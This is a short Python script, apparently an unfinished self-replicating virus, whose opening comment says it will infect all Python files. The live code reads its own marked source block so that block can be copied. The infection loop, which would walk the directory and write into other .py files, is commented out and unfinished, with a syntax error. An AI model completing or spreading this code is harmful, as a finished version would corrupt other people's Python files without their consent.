#it will infect all files that are python, only run this inside its own folder

#START#

import os

dir = os.getcwd()
print("working  directory" + dir)



#read code from current program

File = open(__file__, "r")  
Virus = ""
readVirus = False

for line in File:
    if line == "#START#\n":
        readVirus = True
        Virus += line
    elif line == "#END#\n":
        readVirus = False
        Virus += line
        break
    elif readVirus == True:
        Virus += line

File.close()

print(Virus)

#payload

#for forlder in os.walk(os.getcwd()):
#    for file in folder[2]:
#        if os.path.splitext(file) [1] == ".py":
#            path os.path.join

#comments in caps are flags to make it run

#END#